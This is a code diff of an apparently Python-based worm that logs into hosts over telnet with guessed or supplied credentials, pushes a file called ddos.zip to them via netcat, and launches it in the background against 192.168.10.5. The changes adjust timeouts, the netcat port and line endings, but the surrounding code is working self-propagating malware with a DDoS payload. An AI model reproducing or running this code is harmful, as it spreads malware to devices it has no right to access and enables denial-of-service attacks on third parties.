@@ -23,13 +23,13 @@ def is_open(host, port):
 def login(host, username, password):
     try:
         # Start connection
-        tn = telnetlib.Telnet(host, timeout=1)
+        tn = telnetlib.Telnet(host, timeout=5)
         # 'b' before converts to binary
         tn.read_until(b"login: ", 10)
         tn.write(username.encode('ascii') + b"\n")
 
         if password:
-            tn.read_until(b"Password: ")
+            tn.read_until(b"Password: ", 5)
             tn.write(password.encode('ascii') + b"\n")
     except:
         # print("Cannot connect to host:", host)
@@ -42,12 +42,12 @@ def login(host, username, password):
 def replicate(tn):
     try:
         # Open nc connection to receive the file
-        tn.write(b"nc -l -p 1234 > ddos.zip\n")
-        os.system("nc -w 5 {} 1234 < ddos.zip".format(tn.host))
+        tn.write(b"nc -l -p 10000 > ddos.zip\r\n")
+        os.system("nc -w 5 {} 10000 < ddos.zip".format(tn.host))
         # Execute script
-        tn.write(b"nohup python3 ddos.zip 192.168.10.5 5 &\n")
-        tn.write(b"exit\n")   
-
+        tn.write(b"nohup python3 ddos.zip 192.168.10.5 5 &\r\n")
+        tn.write(b"exit\r\n")
+        tn.close()   
     except EOFError:
         print("Connection to host lost")
     except: 
